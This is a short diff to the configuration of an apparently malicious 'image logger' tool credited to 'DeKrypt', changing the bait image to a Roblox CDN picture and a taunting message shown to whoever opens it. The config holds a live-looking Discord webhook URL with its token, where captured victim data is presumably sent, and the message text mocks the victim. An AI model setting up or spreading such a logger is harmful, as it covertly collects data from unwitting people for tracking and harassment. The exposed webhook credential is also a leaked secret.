@@ -10,7 +10,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1353065109349470269/9MqS3VheP9uWwNosAO31G0Ot5oor8KDfkJVRj8ARdi5u18zfTU1RiX5OamEC4F8qkSOJ",
-    "image": "", # You can also have a custom image by using a URL argument
+    "image": "https://images.rbxcdn.com/5348266ea6c5e67b19d6a814cbbb70f6.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -25,7 +25,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "get fucked by @fw8l bozo LOOOL", # Message to show
+        "message": "@fw8l was here hahaha", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
